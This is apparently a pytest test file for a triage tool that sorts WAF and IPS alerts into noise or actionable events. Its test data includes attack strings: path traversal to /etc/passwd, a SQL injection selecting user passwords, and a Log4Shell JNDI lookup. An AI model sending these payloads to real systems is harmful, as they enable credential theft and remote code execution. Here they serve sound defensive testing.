import asyncio
import json
from types import SimpleNamespace

import pytest
from fastapi import HTTPException

from core.triage import analyze
from core.triage_filter import screen_event


def event(**changes):
    value = dict(device='WAF', action='allowed', method='GET', path='/.env',
                 category='lfi', family='정보 수집성', status=404, status_source='origin',
                 reasons=[], technologies=[])
    value.update(changes)
    return value


def test_ips_block_is_screened_even_when_asset_or_group_needs_investigation():
    for reasons in ([], ['MIXED_ALLOWED_BLOCKED'], ['IMPORTANT_ASSET']):
        result = screen_event(event(device='IPS', action='blocked', reasons=reasons))
        assert result['screened'] and result['code'] == 'IPS_BLOCKED'
    assert not screen_event(event(device='IPS', action='allowed', status=None))['screened']
    assert not screen_event(event(device='WAF', action='blocked', status=None))['screened']


@pytest.mark.parametrize('status', [400, 401, 403, 404, 410, 429, 499])
@pytest.mark.parametrize('source', ['origin', 'edge', 'unknown'])
def test_simple_4xx_probe_is_default_noise_without_claiming_origin_or_safety(status, source):
    answer = screen_event(event(status=status, status_source=source))
    assert answer['screened'] and answer['code'] == 'SIMPLE_SCAN_4XX'


@pytest.mark.parametrize('changes', [
    dict(status=None), dict(status=200), dict(status=500),
    dict(path='/.env?x=1'), dict(method='POST'),
    dict(path='/../../etc/passwd'), dict(path='/%252e%252e/etc/passwd', category=''),
    dict(fields={'request_body': 'id=1 UNION SELECT password FROM users'}),
    dict(fields={'webQuery': 'id=1'}),
    dict(fields={'layer_7_data': 'HTTP Request Body == arbitrary body;;;'}),
    dict(attack_evidence=['header: log4shell · ${jndi:ldap://example.test/a}']),
    dict(category='cmdi'), dict(category='sqli'), dict(cve=['CVE-2021-44228']),
])
def test_missing_status_or_non_simple_request_is_retained(changes):
    assert not screen_event(event(**changes))['screened']


def test_technology_match_does_not_override_a_simple_failed_probe():
    matched = event(path='/wp-login.php', category='', technologies=['WordPress'], status=403)
    assert screen_event(matched)['code'] == 'SIMPLE_SCAN_4XX'
    assert screen_event(event(**dict(path='/wp-login.php', category='', technologies=['WordPress'], status=200)))['code'] == 'TECH_MATCH'
    # Missing fingerprint is not proof that the technology is absent.
    assert not screen_event(event(path='/wp-login.php', category='', technologies=['Next.js'], status=None))['screened']


def test_named_scanner_4xx_can_be_filtered_but_generic_4xx_is_retained():
    assert screen_event(event(path='/owa/auth/x.js', category='', family='기타/미분류',
                              event_name='ZGrab Application Layer Scanner Traffic', status=404))['screened']
    assert not screen_event(event(path='/account', category='', family='기타/미분류',
                                  event_name='Access denied', status=403))['screened']


def test_analyze_preserves_screened_events_in_statistics_and_export():
    result = analyze(json.dumps([
        dict(device_type='IPS', evtname='Port Scan', host='a.test', url='/x', act='Block'),
        dict(device_type='WAF', evtname='File scan', host='b.test', url='/.env',
             method='GET', act='Permit', status=404, response_source='origin'),
        dict(device_type='WAF', evtname='File scan', host='c.test', url='/.env',
             method='GET', act='Permit', status=403),
        dict(device_type='WAF', evtname='SQL Injection', host='d.test', url='/search',
             method='GET', webQuery='id=1 UNION SELECT password FROM users', act='Permit', status=403),
    ]))
    assert result['summary']['parsed'] == result['statistics']['total'] == 4
    assert [e['screening']['screened'] for e in result['events']] == [True, True, True, False]
    assert result['screening_summary'] == {'screened': 3, 'actionable': 1}
    assert result['target_requests'] == 0
    json.dumps(result)



def test_technology_probe_requires_registered_origin_and_reads_headers_only(monkeypatch):
    import routers.triage as triage_router
    calls = []

    class FakeResponse:
        status_code = 200
        headers = {'server': 'nginx'}
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass

    class FakeClient:
        def __init__(self, **kwargs): calls.append(('client', kwargs))
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        def stream(self, method, url):
            calls.append(('stream', method, url))
            return FakeResponse()

    monkeypatch.setattr(triage_router, 'get_store', lambda: SimpleNamespace(
        inventory=lambda owner: [{'origin': 'https://web.test'}]))
    monkeypatch.setattr(triage_router.httpx, 'AsyncClient', FakeClient)
    request = SimpleNamespace(headers={}, cookies={})
    with pytest.raises(HTTPException) as exc:
        asyncio.run(triage_router.technology_probe(triage_router.TechnologyProbe(origin='https://other.test'), request))
    assert exc.value.status_code == 403 and not calls
    answer = asyncio.run(triage_router.technology_probe(
        triage_router.TechnologyProbe(origin='https://web.test'), request))
    assert answer['technologies'] == ['nginx']
    assert ('stream', 'GET', 'https://web.test/') in calls
    assert calls[0][1]['follow_redirects'] is False
